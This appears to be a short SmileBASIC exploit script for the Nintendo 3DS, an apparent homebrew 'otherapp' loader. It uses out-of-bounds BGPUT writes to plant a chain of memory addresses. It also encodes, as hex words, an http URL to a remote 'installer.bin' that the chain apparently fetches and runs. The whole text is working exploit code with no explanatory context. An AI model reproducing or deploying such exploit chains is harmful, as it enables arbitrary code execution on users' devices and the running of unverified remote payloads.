OA$="<INSERT OTHERAPP HERE>"
BGSCREEN 0,1073741824,2
B0=BGGET(0,33353,0)
B1=BGGET(0,33353,1)
B=((B1 OR (B0 << 16))+148)/4
DEF W A,V
  BGPUT 0,A+38895559-B,0,V>>16
  BGPUT 0,A+38895559-B,1,V
END

W 0,&H134544
W 1,&H400000
W 2,&H103B57
W 3,&H946001C
W 4,&H1
W 8,&H1B81E0
W 16,&H104730
W 19,&H134544
W 20,&H400000
W 21,&H1B8194
W 23,&H134544
W 24,&H400000
W 25,&H103B57
W 26,&H30010000
W 27,&H800
W 31,&H1B7C0C
W 33,&H134544
W 34,&H30010000
W 35,&H1DEB70
W 36,&H10193D
W 37,&H134548

W 64,&H70747468
W 65,&H732F2F3A
W 66,&H6C61656D
W 67,&H672E6D75
W 68,&H75687469
W 69,&H6F692E62
W 70,&H7364332F
W 71,&H6F2F732F
W 72,&H6A5F646C
W 73,&H30337061
W 74,&H6E692F30
W 75,&H6C617473
W 76,&H2E72656C
W 77,&H6E6962
